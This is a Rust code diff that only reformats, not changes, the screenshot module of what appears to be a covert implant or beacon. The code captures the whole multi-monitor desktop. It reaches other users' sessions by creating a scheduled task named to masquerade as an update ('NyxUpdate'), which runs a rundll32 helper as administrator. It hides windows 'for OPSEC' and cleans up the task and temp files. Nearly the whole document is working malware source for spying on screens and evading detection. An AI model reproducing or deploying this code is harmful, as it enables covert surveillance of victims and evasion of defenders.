@@ -91,13 +91,9 @@ fn force_load(dll: &[u8]) -> bool {
 /// system gives us), but on modern Windows this almost always succeeds.
 fn set_dpi_aware() -> bool {
     // Win10 1607+ / Win 8.1+: shcore.dll SetProcessDpiAwareness
-    if let Some(addr) =
-        unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") }
-    {
-        type SetProcessDpiAwareness =
-            unsafe extern "system" fn(u32) -> i32;
-        let f: SetProcessDpiAwareness =
-            unsafe { core::mem::transmute(addr) };
+    if let Some(addr) = unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") } {
+        type SetProcessDpiAwareness = unsafe extern "system" fn(u32) -> i32;
+        let f: SetProcessDpiAwareness = unsafe { core::mem::transmute(addr) };
         // PROCESS_PER_MONITOR_DPI_AWARE_V2 = 3
         if unsafe { f(3) } != 0 {
             return true;
@@ -108,13 +104,9 @@ fn set_dpi_aware() -> bool {
         }
     }
     // Vista / 7 fallback
-    if let Some(addr) =
-        unsafe { export_addr(b"user32.dll", b"SetProcessDPIAware") }
-    {
-        type SetProcessDPIAware =
-            unsafe extern "system" fn() -> i32;
-        let f: SetProcessDPIAware =
-            unsafe { core::mem::transmute(addr) };
+    if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDPIAware") } {
+        type SetProcessDPIAware = unsafe extern "system" fn() -> i32;
+        let f: SetProcessDPIAware = unsafe { core::mem::transmute(addr) };
         return unsafe { f() } != 0;
     }
     false
@@ -211,48 +203,41 @@ unsafe fn attach_interactive() -> bool {
     use core::ffi::c_void;
     type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
     type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
-    type OpenDesktopW =
-        unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
+    type OpenDesktopW = unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
     type SetThreadDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
     type CloseDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
     type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
 
-    let ows: OpenWindowStationW = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
-    let spws: SetProcessWindowStation = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
-    let odk: OpenDesktopW = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
-    let std: SetThreadDesktop = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
-    let cd: CloseDesktop = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"CloseDesktop")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
-    let cws: CloseWindowStation = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
+    let ows: OpenWindowStationW =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let spws: SetProcessWindowStation =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let odk: OpenDesktopW =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let std: SetThreadDesktop =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let cd: CloseDesktop =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseDesktop") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let cws: CloseWindowStation =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
 
     // GENERIC_READ | GENERIC_WRITE = 0xC0000066 for the station; the desktop
     // needs GENERIC_READ etc. too. These are permissive — SYSTEM can usually
@@ -286,7 +271,6 @@ unsafe fn attach_interactive() -> bool {
     ok
 }
 
-
 /// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
 /// desktop (same-session), captures the full virtual screen (all monitors),
 /// BMP file bytes. `None` on any failure. Shared by `do_screenshot` (beacon
@@ -305,20 +289,43 @@ fn capture_bmp() -> Option<Vec<u8>> {
     type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
     type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
     type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-    type BitBlt = unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32, *mut c_void, i32, i32, u32) -> i32;
-    type GetDiBits = unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, *mut c_void, *mut BitmapInfoHeader, u32) -> i32;
+    type BitBlt = unsafe extern "system" fn(
+        *mut c_void,
+        i32,
+        i32,
+        i32,
+        i32,
+        *mut c_void,
+        i32,
+        i32,
+        u32,
+    ) -> i32;
+    type GetDiBits = unsafe extern "system" fn(
+        *mut c_void,
+        *mut c_void,
+        u32,
+        u32,
+        *mut c_void,
+        *mut BitmapInfoHeader,
+        u32,
+    ) -> i32;
     type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
     type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
 
-    let gsm: GetSystemMetrics = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
+    let gsm: GetSystemMetrics =
+        unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
     let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
     let rdc: ReleaseDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
-    let ccdc: CreateCompatibleDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
-    let ccb: CreateCompatibleBitmap = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
-    let so: SelectObject = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
+    let ccdc: CreateCompatibleDc =
+        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
+    let ccb: CreateCompatibleBitmap =
+        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
+    let so: SelectObject =
+        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
     let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
     let gdb: GetDiBits = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
-    let do_: DeleteObject = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
+    let do_: DeleteObject =
+        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
     let ddc: DeleteDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
 
     // Capture the FULL virtual desktop (all monitors tiled), not just the
@@ -331,7 +338,9 @@ fn capture_bmp() -> Option<Vec<u8>> {
     let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
     let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
     let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
-    if w <= 0 || h <= 0 { return None; }
+    if w <= 0 || h <= 0 {
+        return None;
+    }
     let (w, h) = (w as usize, h as usize);
     let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
     let bytes = pc.checked_mul(4)?;
@@ -339,24 +348,61 @@ fn capture_bmp() -> Option<Vec<u8>> {
 
     let filled = unsafe {
         let sdc = gdc(core::ptr::null_mut());
-        if sdc.is_null() { return None; }
+        if sdc.is_null() {
+            return None;
+        }
         let mdc = ccdc(sdc);
-        if mdc.is_null() { rdc(core::ptr::null_mut(), sdc); return None; }
+        if mdc.is_null() {
+            rdc(core::ptr::null_mut(), sdc);
+            return None;
+        }
         let bmp = ccb(sdc, w as i32, h as i32);
-        if bmp.is_null() { ddc(mdc); rdc(core::ptr::null_mut(), sdc); return None; }
+        if bmp.is_null() {
+            ddc(mdc);
+            rdc(core::ptr::null_mut(), sdc);
+            return None;
+        }
         let prev = so(mdc, bmp);
         // Source origin = virtual-screen top-left (may be negative). Destination
         // = (0,0) in the memory DC. This blits every monitor into one bitmap.
         if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY) == 0 {
-            so(mdc, prev); do_(bmp); ddc(mdc); rdc(core::ptr::null_mut(), sdc);
+            so(mdc, prev);
+            do_(bmp);
+            ddc(mdc);
+            rdc(core::ptr::null_mut(), sdc);
             return None;
         }
-        let mut bi = BitmapInfoHeader { bi_size: 40, bi_width: w as i32, bi_height: h as i32, bi_planes: 1, bi_bit_count: 32, bi_compression: 0, bi_size_image: (w as u32)*(h as u32)*4, bi_x_pels_per_meter: 0, bi_y_pels_per_meter: 0, bi_clr_used: 0, bi_clr_important: 0 };
-        let got = gdb(sdc, bmp, 0, h as u32, pixels.as_mut_ptr() as *mut c_void, &mut bi, DIB_RGB_COLORS);
-        so(mdc, prev); do_(bmp); ddc(mdc); rdc(core::ptr::null_mut(), sdc);
+        let mut bi = BitmapInfoHeader {
+            bi_size: 40,
+            bi_width: w as i32,
+            bi_height: h as i32,
+            bi_planes: 1,
+            bi_bit_count: 32,
+            bi_compression: 0,
+            bi_size_image: (w as u32) * (h as u32) * 4,
+            bi_x_pels_per_meter: 0,
+            bi_y_pels_per_meter: 0,
+            bi_clr_used: 0,
+            bi_clr_important: 0,
+        };
+        let got = gdb(
+            sdc,
+            bmp,
+            0,
+            h as u32,
+            pixels.as_mut_ptr() as *mut c_void,
+            &mut bi,
+            DIB_RGB_COLORS,
+        );
+        so(mdc, prev);
+        do_(bmp);
+        ddc(mdc);
+        rdc(core::ptr::null_mut(), sdc);
         got != 0
     };
-    if !filled { return None; }
+    if !filled {
+        return None;
+    }
 
     let fs = 14 + 40 + pixels.len();
     let mut b: Vec<u8> = Vec::with_capacity(fs);
@@ -370,7 +416,7 @@ fn capture_bmp() -> Option<Vec<u8>> {
     b.extend_from_slice(&1u16.to_le_bytes());
     b.extend_from_slice(&32u16.to_le_bytes());
     b.extend_from_slice(&0u32.to_le_bytes());
-    b.extend_from_slice(&((w as u32)*(h as u32)*4).to_le_bytes());
+    b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
     b.extend_from_slice(&0i32.to_le_bytes());
     b.extend_from_slice(&0i32.to_le_bytes());
     b.extend_from_slice(&0u32.to_le_bytes());
@@ -385,23 +431,58 @@ fn capture_bmp() -> Option<Vec<u8>> {
 /// `capture_to_file` (BMP) and `capture_diag` (test log). Returns false on any
 /// resolution / open / write failure.
 unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
-    let cf: unsafe extern "system" fn(*const u16, u32, u32, *const c_void, u32, u32, *mut c_void) -> *mut c_void =
-        match unsafe { export_addr(b"kernel32.dll", b"CreateFileW") } { Some(a) => unsafe { core::mem::transmute(a) }, None => return false };
+    let cf: unsafe extern "system" fn(
+        *const u16,
+        u32,
+        u32,
+        *const c_void,
+        u32,
+        u32,
+        *mut c_void,
+    ) -> *mut c_void = match unsafe { export_addr(b"kernel32.dll", b"CreateFileW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
     let wf: unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *const c_void) -> i32 =
-        match unsafe { export_addr(b"kernel32.dll", b"WriteFile") } { Some(a) => unsafe { core::mem::transmute(a) }, None => return false };
+        match unsafe { export_addr(b"kernel32.dll", b"WriteFile") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
     let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
-        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } { Some(a) => unsafe { core::mem::transmute(a) }, None => return false };
+        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
     let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
-    for &by in path { if by == 0 { break; } wide.push(by as u16); }
+    for &by in path {
+        if by == 0 {
+            break;
+        }
+        wide.push(by as u16);
+    }
     wide.push(0);
-    let h = unsafe { cf(wide.as_ptr(), 0x4000_0000, 0, core::ptr::null(), 2, 0, core::ptr::null_mut()) };
-    if h.is_null() { return false; }
+    let h = unsafe {
+        cf(
+            wide.as_ptr(),
+            0x4000_0000,
+            0,
+            core::ptr::null(),
+            2,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if h.is_null() {
+        return false;
+    }
     let mut off = 0usize;
     let mut ok = true;
     while off < data.len() {
         let want = (data.len() - off).min(8192) as u32;
         let mut wr: u32 = 0;
-        if unsafe { wf(h, data.as_ptr().add(off), want, &mut wr, core::ptr::null()) } == 0 || wr == 0 {
+        if unsafe { wf(h, data.as_ptr().add(off), want, &mut wr, core::ptr::null()) } == 0
+            || wr == 0
+        {
             ok = false;
             break;
         }
@@ -413,7 +494,10 @@ unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
 
 /// Capture → write BMP to `path` (ASCII, NUL-terminated). Helper export path.
 pub unsafe fn capture_to_file(path: &[u8]) -> bool {
-    let bmp = match capture_bmp() { Some(b) => b, None => return false };
+    let bmp = match capture_bmp() {
+        Some(b) => b,
+        None => return false,
+    };
     unsafe { write_all_to_file(path, &bmp) }
 }
 
@@ -433,7 +517,9 @@ pub fn do_screenshot(monitor: u8) -> Vec<Response> {
     // leak into this one's error message. Every None-return path inside
     // cross_session_capture sets it before returning; this just guarantees a
     // clean baseline (e.g. if path 1 succeeds after a previous path-2 failure).
-    unsafe { XSESS_FAIL = 0; }
+    unsafe {
+        XSESS_FAIL = 0;
+    }
     // Path 1: same-session direct capture.
     if let Some(bmp) = capture_bmp() {
         return chunk_stream(bmp, "screenshot.bmp");
@@ -465,7 +551,8 @@ fn format_err(c: u8) -> String {
         8 => "an export could not be resolved",
         _ => "unknown (step 0 = no failure path was hit)",
     };
-    let mut s = String::from("screenshot: same-session BitBlt failed + cross-session failed (step ");
+    let mut s =
+        String::from("screenshot: same-session BitBlt failed + cross-session failed (step ");
     s.push((b'0' + c) as char);
     s.push_str(": ");
     s.push_str(why);
@@ -481,7 +568,9 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     // so any `?` early-return from an unresolved export_addr surfaces as step 8
     // rather than step 0 ("unknown"). This is the documented diagnostic
     // contract: 8 = export resolution failed somewhere in this function.
-    unsafe { XSESS_FAIL = 8; }
+    unsafe {
+        XSESS_FAIL = 8;
+    }
 
     // 1. Find an active interactive session (RDP or console). We enumerate all
     //    sessions via WTSEnumerateSessions and pick the first WTSActive one
@@ -490,14 +579,19 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     //    common server case.
     let lla: unsafe extern "system" fn(*const u8) -> *mut c_void =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"LoadLibraryA")?) };
-    if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() { unsafe { XSESS_FAIL = 2; } return None; }
+    if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() {
+        unsafe {
+            XSESS_FAIL = 2;
+        }
+        return None;
+    }
     // WTS_CURRENT_SERVER_HANDLE = NULL (the local RDSS).
     type WTSEnumerateSessionsW = unsafe extern "system" fn(
-        *mut c_void, // hServer (NULL = local)
-        u32,         // Reserved (0)
-        u32,         // Version (1)
+        *mut c_void,  // hServer (NULL = local)
+        u32,          // Reserved (0)
+        u32,          // Version (1)
         *mut *mut u8, // ppSessionInfo
-        *mut u32,    // pCount
+        *mut u32,     // pCount
     ) -> i32;
     type WTSFreeMemory = unsafe extern "system" fn(*mut c_void);
     // WTS_SESSION_INFOA: { DWORD SessionId; LPSTR pWinStationName; DWORD State }
@@ -514,17 +608,27 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSFreeMemory")?) };
     let mut buf: *mut u8 = core::ptr::null_mut();
     let mut count: u32 = 0;
-    if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0 || buf.is_null() {
-        unsafe { XSESS_FAIL = 1; }
+    if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0
+        || buf.is_null()
+    {
+        unsafe {
+            XSESS_FAIL = 1;
+        }
         return None;
     }
     // Scan for the first Active (state 0) session.
-    let sessions = unsafe { core::slice::from_raw_parts(buf as *const WtsSessionInfo, count as usize) };
+    let sessions =
+        unsafe { core::slice::from_raw_parts(buf as *const WtsSessionInfo, count as usize) };
     let active_sid = sessions.iter().find(|s| s.state == 0).map(|s| s.session_id);
     unsafe { free_mem(buf as *mut c_void) };
     let sid = match active_sid {
         Some(s) => s,
-        None => { unsafe { XSESS_FAIL = 1; } return None; } // no active session
+        None => {
+            unsafe {
+                XSESS_FAIL = 1;
+            }
+            return None;
+        } // no active session
     };
 
     // 2. No token theft needed. The Task Scheduler service runs as SYSTEM and
@@ -570,7 +674,9 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         }
     }
     if !resolved {
-        for &b in canonical { dpath.push(b as u16); }
+        for &b in canonical {
+            dpath.push(b as u16);
+        }
     }
 
     // Pre-clean: delete any BMP left over from a PRIOR run before we spawn the
@@ -584,11 +690,14 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     //    (No surrounding quotes — schtasks /tr wraps it; the DLL path has no
     //    spaces in the canonical deployment path C:\nyx\... . If a future
     //    deployment path contains spaces this will need quoting.)
-    let mut helper_cmd: crate::heap::Vec<u16> =
-        crate::heap::Vec::with_capacity(80 + dpath.len());
-    for &by in b"C:\\Windows\\System32\\rundll32.exe " { helper_cmd.push(by as u16); }
+    let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
+    for &by in b"C:\\Windows\\System32\\rundll32.exe " {
+        helper_cmd.push(by as u16);
+    }
     cmd_extend_wide(&mut helper_cmd, &dpath);
-    for &by in b",nyx_screenshot_session" { helper_cmd.push(by as u16); }
+    for &by in b",nyx_screenshot_session" {
+        helper_cmd.push(by as u16);
+    }
 
     // 5. Spawn the helper via the Task Scheduler service. We create a one-shot
     //    task that runs as the interactive user (`/ru administrator` — no
@@ -605,7 +714,9 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     //    concurrent screenshot calls and masquerades as an update task. We use
     //    GetTickCount for entropy (cheap, always available).
     let mut task_name: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(24);
-    for &by in b"NyxUpdate" { task_name.push(by as u16); }
+    for &by in b"NyxUpdate" {
+        task_name.push(by as u16);
+    }
     let gtc: unsafe extern "system" fn() -> u32 =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"GetTickCount")?) };
     let seed = unsafe { gtc() };
@@ -613,13 +724,21 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
 
     // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /ru administrator /it /f
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
-    for &by in b"schtasks /create /tn " { create_cmd.push(by as u16); }
+    for &by in b"schtasks /create /tn " {
+        create_cmd.push(by as u16);
+    }
     create_cmd.extend_from_slice(&task_name);
-    for &by in b" /tr \"" { create_cmd.push(by as u16); }
+    for &by in b" /tr \"" {
+        create_cmd.push(by as u16);
+    }
     create_cmd.extend_from_slice(&helper_cmd);
-    for &by in b"\" /sc once /st 23:59 /ru administrator /it /f\0" { create_cmd.push(by as u16); }
+    for &by in b"\" /sc once /st 23:59 /ru administrator /it /f\0" {
+        create_cmd.push(by as u16);
+    }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
-        unsafe { XSESS_FAIL = 5; }
+        unsafe {
+            XSESS_FAIL = 5;
+        }
         // Best-effort cleanup of a half-created task before bailing.
         let _ = unsafe { delete_task(&task_name) };
         return None;
@@ -629,11 +748,15 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     //    the active session; we can't WaitForSingleObject on it (we don't get a
     //    handle), so we poll the BMP file below.
     let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
-    for &by in b"schtasks /run /tn " { run_cmd.push(by as u16); }
+    for &by in b"schtasks /run /tn " {
+        run_cmd.push(by as u16);
+    }
     run_cmd.extend_from_slice(&task_name);
     run_cmd.push(0);
     if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
-        unsafe { XSESS_FAIL = 5; }
+        unsafe {
+            XSESS_FAIL = 5;
+        }
         let _ = unsafe { delete_task(&task_name) };
         return None;
     }
@@ -665,7 +788,9 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
             // helper finished but no valid BMP. We can't tell the helper's exit
             // code without a handle, so report timeout here.
             let _ = del_file(SHOT_TEMP);
-            unsafe { XSESS_FAIL = 7; }
+            unsafe {
+                XSESS_FAIL = 7;
+            }
             None
         }
     }
@@ -678,20 +803,44 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
 /// Stdout/stderr are discarded (CREATE_NO_WINDOW + no pipe) for OPSEC.
 unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
     type CreateProcessW = unsafe extern "system" fn(
-        *const u16, *mut u16, *const c_void, *const c_void, i32, u32,
-        *const c_void, *const u16, *mut StartupInfoRun, *mut ProcessInfoRun,
+        *const u16,
+        *mut u16,
+        *const c_void,
+        *const c_void,
+        i32,
+        u32,
+        *const c_void,
+        *const u16,
+        *mut StartupInfoRun,
+        *mut ProcessInfoRun,
     ) -> i32;
     #[repr(C)]
     struct StartupInfoRun {
-        cb: u32, lp_reserved: *const u16, lp_desktop: *const u16, lp_title: *const u16,
-        dw_x: u32, dw_y: u32, dw_x_size: u32, dw_y_size: u32,
-        dw_x_count_chars: u32, dw_y_count_chars: u32, dw_fill_attribute: u32, dw_flags: u32,
-        w_show_window: u16, cb_reserved2: u16, lp_reserved2: *mut u8,
-        h_std_input: *mut c_void, h_std_output: *mut c_void, h_std_error: *mut c_void,
+        cb: u32,
+        lp_reserved: *const u16,
+        lp_desktop: *const u16,
+        lp_title: *const u16,
+        dw_x: u32,
+        dw_y: u32,
+        dw_x_size: u32,
+        dw_y_size: u32,
+        dw_x_count_chars: u32,
+        dw_y_count_chars: u32,
+        dw_fill_attribute: u32,
+        dw_flags: u32,
+        w_show_window: u16,
+        cb_reserved2: u16,
+        lp_reserved2: *mut u8,
+        h_std_input: *mut c_void,
+        h_std_output: *mut c_void,
+        h_std_error: *mut c_void,
     }
     #[repr(C)]
     struct ProcessInfoRun {
-        h_process: *mut c_void, h_thread: *mut c_void, dw_pid: u32, dw_tid: u32,
+        h_process: *mut c_void,
+        h_thread: *mut c_void,
+        dw_pid: u32,
+        dw_tid: u32,
     }
     let cpw: CreateProcessW = match unsafe { export_addr(b"kernel32.dll", b"CreateProcessW") } {
         Some(a) => unsafe { core::mem::transmute(a) },
@@ -712,11 +861,16 @@ unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
     // handled by cmd. Build in one writable buffer (CreateProcessW may mutate
     // lpCommandLine in place).
     let mut full = crate::heap::Vec::<u16>::with_capacity(12);
-    for &by in b"cmd.exe /C " { full.push(by as u16); }
+    for &by in b"cmd.exe /C " {
+        full.push(by as u16);
+    }
     // Append the caller's cmdline (up to its NUL).
     let mut i = 0usize;
     unsafe {
-        while *cmdline.add(i) != 0 { full.push(*cmdline.add(i)); i += 1; }
+        while *cmdline.add(i) != 0 {
+            full.push(*cmdline.add(i));
+            i += 1;
+        }
     }
     full.push(0);
 
@@ -725,11 +879,22 @@ unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
     let mut pi: ProcessInfoRun = unsafe { core::mem::zeroed() };
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
     let ok = unsafe {
-        cpw(core::ptr::null(), full.as_mut_ptr(),
-            core::ptr::null(), core::ptr::null(), 0, CREATE_NO_WINDOW,
-            core::ptr::null(), core::ptr::null(), &mut si, &mut pi)
+        cpw(
+            core::ptr::null(),
+            full.as_mut_ptr(),
+            core::ptr::null(),
+            core::ptr::null(),
+            0,
+            CREATE_NO_WINDOW,
+            core::ptr::null(),
+            core::ptr::null(),
+            &mut si,
+            &mut pi,
+        )
     };
-    if ok == 0 { return false; }
+    if ok == 0 {
+        return false;
+    }
     let waited = unsafe { wso(pi.h_process, 30_000) };
     let mut code: u32 = 0;
     let _ = unsafe { gec(pi.h_process, &mut code) };
@@ -742,9 +907,13 @@ unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
 /// created by cross_session_capture. Returns true if the schtasks call exited 0.
 unsafe fn delete_task(task_name: &[u16]) -> bool {
     let mut cmd = crate::heap::Vec::<u16>::with_capacity(40 + task_name.len());
-    for &by in b"schtasks /delete /tn " { cmd.push(by as u16); }
+    for &by in b"schtasks /delete /tn " {
+        cmd.push(by as u16);
+    }
     cmd.extend_from_slice(task_name);
-    for &by in b" /f\0" { cmd.push(by as u16); }
+    for &by in b" /f\0" {
+        cmd.push(by as u16);
+    }
     unsafe { run_cmd_wait(cmd.as_mut_ptr()) }
 }
 
@@ -755,7 +924,10 @@ fn cmd_extend_wide(v: &mut crate::heap::Vec<u16>, ascii: &[u16]) {
 
 /// Decimal-encode a u16 (0–9999) and append as ASCII chars to `v`.
 fn push_dec_u16(v: &mut crate::heap::Vec<u16>, n: u16) {
-    if n == 0 { v.push(b'0' as u16); return; }
+    if n == 0 {
+        v.push(b'0' as u16);
+        return;
+    }
     let mut buf = [0u8; 5];
     let mut i = buf.len();
     let mut m = n;
@@ -764,21 +936,48 @@ fn push_dec_u16(v: &mut crate::heap::Vec<u16>, n: u16) {
         buf[i] = b'0' + (m % 10) as u8;
         m /= 10;
     }
-    for &b in &buf[i..] { v.push(b as u16); }
+    for &b in &buf[i..] {
+        v.push(b as u16);
+    }
 }
 
 unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
-    let cf: unsafe extern "system" fn(*const u16, u32, u32, *const c_void, u32, u32, *mut c_void) -> *mut c_void =
+    let cf: unsafe extern "system" fn(
+        *const u16,
+        u32,
+        u32,
+        *const c_void,
+        u32,
+        u32,
+        *mut c_void,
+    ) -> *mut c_void =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CreateFileW")?) };
     let rf: unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *const c_void) -> i32 =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"ReadFile")?) };
     let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle")?) };
     let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
-    for &by in path { if by == 0 { break; } wide.push(by as u16); }
+    for &by in path {
+        if by == 0 {
+            break;
+        }
+        wide.push(by as u16);
+    }
     wide.push(0);
-    let h = unsafe { cf(wide.as_ptr(), 0x8000_0000, 1, core::ptr::null(), 3, 0, core::ptr::null_mut()) };
-    if h.is_null() { return None; }
+    let h = unsafe {
+        cf(
+            wide.as_ptr(),
+            0x8000_0000,
+            1,
+            core::ptr::null(),
+            3,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if h.is_null() {
+        return None;
+    }
     let mut out: Vec<u8> = Vec::new();
     let mut buf = [0u8; 8192];
     // Read loop: only treat `got == 0` (true EOF — ReadFile returns nonzero with
@@ -788,7 +987,15 @@ unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
     // BMP. ReadFile failure (returns 0) is now a hard error.
     loop {
         let mut got: u32 = 0;
-        let ok = unsafe { rf(h, buf.as_mut_ptr(), buf.len() as u32, &mut got, core::ptr::null()) };
+        let ok = unsafe {
+            rf(
+                h,
+                buf.as_mut_ptr(),
+                buf.len() as u32,
+                &mut got,
+                core::ptr::null(),
+            )
+        };
         if ok == 0 {
             // ReadFile itself failed — the partial buffer is untrustworthy.
             let _ = unsafe { ch(h) };
@@ -819,18 +1026,27 @@ unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
 /// callers can surface a persistent-artifact warning if the temp file couldn't
 /// be removed (locked / ACL). -1 if DeleteFileW itself couldn't be resolved.
 unsafe fn del_file(path: &[u8]) -> i32 {
-    let df: unsafe extern "system" fn(*const u16) -> i32 = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
-        Some(a) => unsafe { core::mem::transmute(a) }, None => return -1,
-    };
+    let df: unsafe extern "system" fn(*const u16) -> i32 =
+        match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return -1,
+        };
